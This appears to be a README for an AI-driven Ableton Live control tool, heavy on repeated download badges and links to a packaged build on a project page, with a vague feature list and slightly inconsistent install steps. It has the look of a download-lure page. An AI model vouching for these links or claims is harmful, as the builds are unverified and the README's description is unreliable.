# Ableton AI Assistant v1.0.0 - audio assistant 2026

> **AI-driven Ableton Live control for real-time audio workflows, mixing, and mastering, with MCP integration and low-latency TCP support in version 1.0.0.**

[![Platform](https://img.shields.io/badge/Platform-Ableton%20Live-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hayesevanwrxh9311/ableton-ai-audio-assistant?style=flat-square)](https://github.com/hayesevanwrxh9311/ableton-ai-audio-assistant)

---

<p align="center">
  <a href="https://hayesevanwrxh9311.github.io/ableton-ai-audio-assistant/">
    <img src="https://img.shields.io/badge/Download-Ableton%20AI%20Assistant%20Latest-brightgreen?style=for-the-badge" alt="Download Ableton AI Assistant">
  </a>
</p>

> **[Direct Download - Ableton AI Assistant v1.0.0](https://hayesevanwrxh9311.github.io/ableton-ai-audio-assistant/)**

---

[Download Latest Build](https://hayesevanwrxh9311.github.io/ableton-ai-audio-assistant/)

---

## Overview

Ableton AI Assistant is a focused audio companion for Ableton Live that pairs AI-guided workflows with direct access to remote scripts. It is built for situations where live sessions need fast responses and accurate adjustments, especially during mixing and mastering.

Rather than trying to cover every studio task, the project concentrates on hands-on audio control. With MCP server integration, TCP communication, and Ableton remote script support, it can slot into connected setups that depend on external coordination and low-latency command handling.

---

## Features

- Adaptive compression for shaping dynamic material
- EQ side cutting for tighter frequency control
- MCP server integration for connected workflow control
- Low-latency TCP control for responsive interaction
- True peak and LUFS control for loudness-focused work
- Ableton remote script support for Live integration
- AI-assisted workflow alignment for mixing and mastering tasks
- Built around real-time audio use cases

---

## Installation

1. Clone or download the repository:
   - `git clone https://github.com/hayesevanwrxh9311/ableton-ai-audio-assistant.git
2. Open the project folder:
   - `cd ableton-ai-assistant`
3. Put the script or package where your Ableton Live setup expects it.
4. Restart Ableton Live after changing the remote script files or connection settings.

If you are using a packaged build, download the latest release from the project page and follow the included setup steps for your environment.

---

## Usage

A common setup is to link Ableton Live with the assistant and then send control commands through MCP or TCP, depending on how your environment is arranged.

Example flow:

1. Start Ableton Live.
2. Launch or load the Ableton AI Assistant component.
3. Connect the remote script or network endpoint.
4. Use the assistant to guide compression, EQ side cutting, and loudness adjustments.
5. Monitor true peak and LUFS targets while working on the mix or master.

For network-driven setups, point your client or controller to the configured TCP endpoint before issuing commands.

---

## Configuration

Configuration is usually managed through the Ableton remote script setup plus any TCP or MCP connection details defined for your environment.

Example configuration pattern:

    {
      "host": "127.0.0.1",
      "port": 3000,
      "mcp_enabled": true,
      "tcp_enabled": true,
      "lufs_target": -14,
      "true_peak_limit": -1.0
    }

Adjust the values to match your local workflow, then restart the connected components so the changes take effect.

---

## Requirements

- Ableton Live
- Support for Ableton remote scripts
- A local or network environment for TCP control
- MCP-compatible client or service if you plan to use MCP integration
- Storage for the project files and any associated configuration

---

## FAQ

**How do I update to a newer version?**  
Download the latest build from the project page and replace the existing files according to your setup.

**Where do I change connection settings?**  
Check the remote script configuration and any MCP or TCP settings used by your local deployment.

**What should I do if Ableton Live does not respond?**  
Verify that the remote script is installed correctly, the TCP endpoint is reachable, and the expected service is running.

**Can I use this without MCP?**  
The project includes MCP server integration, but your actual workflow can depend on how you configure the assistant.

**Is this only for mixing?**  
No. The feature set also includes mastering-oriented controls such as true peak and LUFS handling.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
